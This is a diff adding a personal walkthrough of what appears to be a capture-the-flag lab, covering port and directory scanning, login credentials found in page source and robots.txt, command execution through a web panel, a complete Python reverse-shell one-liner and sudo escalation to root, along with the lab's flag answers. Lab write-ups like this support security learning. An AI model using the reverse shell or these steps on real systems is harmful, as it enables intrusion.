@@ -1,0 +1,54 @@
+Lets first go to the website
+Run an NMAP
+	nmap -sC -sV -p- -vv 10.10.23.174
+Inspect element on website while everything is loading
+	When we inspect element we can see a note to self about a username, the username is 
+	Note to self, remember username!
+    	Username: R1ckRul3s
+Now lets run gobuster
+	gobuster dir -u 10.10.23.174 -w /usr/share/wordlists/dirb/big.txt 
+		We start to get a lot of stuff
+		Looking first at assets, there is nothing really there and nothing to inspect
+		Lets move to robots.txt
+			Wubbalubbadubdub (dont know what this means yet)
+	we still have a username and nowhere to put it, SSH is not working for us with that username and IP address
+		Lets do a gobuster again and this time look for php,txt,zip and html extensions
+			gobuster dir -u 10.10.23.174 -w /usr/share/wordlists/dirb/big.txt -x php,zip,txt,html
+		At the same time i did a medium.txt file for gobuster
+			gobuster dir -u 10.10.23.174 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+		We found a login .php under the big.txt
+		We already know the username and found the password in robots.txt
+			Username: R1ckRul3s
+			Password: Wubbalubbadubdub
+	Once logged in we can type in Linux commands
+		ls -la
+		we see a file for super secret, but we cannot open it
+		nano and cat are not giving us anything, lets try less
+		less Sup3rS3cretPickl3Ingred.txt (less displays file contents without trying to open the file)
+	We cannot find anything else, lets try to open a reverse shell to obtain another password or obtain more files
+		nc -lnvp 9999 (on cmd line in kali)
+		now to a reverse python script
+			we do not need to know how to script python, we can use a cheat sheet located here
+				https://jaytaylor.com/notes/node/1520886669000.html
+			Go down to the python section and make sure to change the IP address and LPORT for the cheatsheet
+		Type in following (the IP address is your local kali linux machine, the port is the port you gave it)
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.23.228",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 
+	Now within command line in linux we can use linux commands (ls -la)
+		Looking at clue.txt it says to search around the file systems
+		lets first look at /home
+			ls -la
+			we can now see 2 folders
+			lets go into rick
+				ls
+				less "second ingredients"
+					1 jerry tear
+		lets lastly try to go into root
+			whoami shows that you are not an admin
+			we are not able to get into root with the current priveleges
+			sudo -l
+			still nothing
+			sudo bash -i (now we are in)
+				cd /root
+				less 3rd.txt
+					fleeb juice
+
